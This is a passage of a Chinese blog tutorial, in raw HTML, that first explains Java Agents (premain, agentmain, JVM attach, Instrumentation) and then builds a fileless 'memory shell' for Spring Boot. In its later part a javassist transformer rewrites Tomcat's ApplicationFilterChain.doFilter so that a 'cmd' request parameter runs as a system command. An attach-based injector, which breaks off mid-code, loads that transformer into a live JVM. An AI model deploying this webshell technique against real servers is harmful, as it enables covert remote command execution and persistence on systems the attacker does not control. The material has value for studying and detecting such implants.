title="Java_Agent示例"></a>Java_Agent示例</h3><h4 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h4><p>我们首先来实现一个简单的<code>premain-Agent</code>，创建一个Maven项目，编写一个简单的premain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在<code>resource/META-INF/</code>下创建<code>MANIFEST.MF</code>清单文件用以指定<code>premain-Agent</code>的启动类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br></pre></td></tr></table></figure><p>将其打包成jar文件</p><p><img src="../images/image-20230816151943665.png" alt="image-20230816151943665"></p><p>创建一个目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加JVM Options（注意冒号之后不能有空格）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span></span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="../images/image-20230816151837614.png" alt="image-20230816151837614"></p><h4 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h4><p>相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。下面我们来了解一下和JVM有关的两个类。</p><p><strong>(重新建一个项目来执行这个)</strong></p><h5 id="VirtualMachine类"><a href="#VirtualMachine类" class="headerlink" title="VirtualMachine类"></a>VirtualMachine类</h5><p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p><p>(<strong>这个就是java在运行之前会编译成class文件  然后并且交给JVM运行 并且这个是一个独立的进程</strong>)        一个独立的进程对应一个独立的JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h5 id="VirtualMachineDescriptor类"><a href="#VirtualMachineDescriptor类" class="headerlink" title="VirtualMachineDescriptor类"></a>VirtualMachineDescriptor类</h5><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;get_PID&quot;</span>))</span><br><span class="line">            System.out.println(vmd.id());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">##</span><br><span class="line"><span class="number">4908</span></span><br><span class="line"> </span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><p>下面我们就来实现一个<code>agentmain-Agent</code>。首先我们编写一个Sleep_Hello类，模拟正在运行的JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sleep_Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写我们的agentmain-Agent类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了agentmain-Agent!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时修改配置MANIFEST.MF文件</p><p>编译打包成jar文件<code>out/artifacts/Java_Agent_jar/Java_Agent.jar</code></p><p>最后编写一个<code>Inject_Agent</code>类，获取特定JVM的PID并注入Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.java.agentmain.agent.Sleep_Hello&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_agentmain_jar/Java_Agent_agentmain.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行 Sleep_Hello</p><p>再运行Inject_Agent</p><p><img src="../images/image-20230816164805056.png" alt="image-20230816164805056"></p><p>这里的名字必须改成这个   否则会找不到</p><p><img src="../images/image-20230816164641786.png" alt="image-20230816164641786"></p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p><img src="../images/image-20230816165234074.png" alt="image-20230816165234074"></p><p>其在Java中是一个接口，常用方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//判断一个类是否被修改</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取目标JVM已加载类"><a href="#获取目标JVM已加载类" class="headerlink" title="获取目标JVM已加载类"></a>获取目标JVM已加载类</h5><p>这里懒得跟了   解释一下就是使用javassist 配合transform来修改正在运行JVM的字节码。 然后配合<code>inject_agent</code>将修改的恶意字节码进行注入</p><p><img src="../images/image-20230816194725502.png" alt="image-20230816194725502"></p><p>这里就是说的是修改前的和修改后的类</p><p><strong>(这篇文章就是在同一个类上进行修改  就满足了上面的所有条件  只是方法体不同而已  就是函数内容不一样)</strong></p><p>想要了解更详细的话 可以去看上面的参考文章  讲的很清楚了  这里是我懒  所以就不继续跟了。。。。。。。。。。。</p><h3 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h3><p>现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。</p><p>这里我们以Spring Boot为例，来实现一个Agent内存马</p><h4 id="Spring-Boot中的Tomcat"><a href="#Spring-Boot中的Tomcat" class="headerlink" title="Spring Boot中的Tomcat"></a>Spring Boot中的Tomcat</h4><p><a href="https://www.cnblogs.com/xiongzaiqiren/p/12466652.html">简单的搭建springboot进行测试</a></p><p><img src="../images/image-20230817110405818.png" alt="image-20230817110405818"></p><p><strong>这里要注意的是启动器得和controller在一个package下  (默认的情况下)</strong></p><p>接下来是搭建这个SpringMVC</p><p>(因为一个小bug  搭建了3个小时  tmd)</p><p><img src="../images/image-20230817164814383.png" alt="image-20230817164814383"></p><p>成功进行搭建</p><p>开始进行分析了</p><p>我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Context:<span class="number">20</span>, Context_Learn (com.example.spring_controller)</span><br><span class="line">...</span><br><span class="line">(org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1067</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">963</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">655</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">764</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230817165727645.png" alt="image-20230817165727645"></p><p>可以看到会按照责任链机制反复调用<code>ApplicationFilterChain#doFilter()</code>方法</p><p><img src="../images/image-20230817170702087.png" alt="image-20230817170702087"></p><p>跟到internalDoFilter()方法中</p><p><img src="../images/image-20230817170732321.png" alt="image-20230817170732321"></p><p>以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h4 id="利用Java-Agent实现Spring-Filter内存马"><a href="#利用Java-Agent实现Spring-Filter内存马" class="headerlink" title="利用Java Agent实现Spring Filter内存马"></a>利用Java Agent实现Spring Filter内存马</h4><p>我们复用上面的agentmain-Agent，修改字节码的关键在于<code>transformer()</code>方法，因此我们重写该方法即可</p><p><strong>(不用premain的原因是因为一般注入内存马的话  程序已经在运行了  就不能在程序运行前进行注入了)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation.transformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置方法体</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//返回目标类字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是构造恶意的字节码</p><p>Inject_Agent_Spring类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent_Spring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span 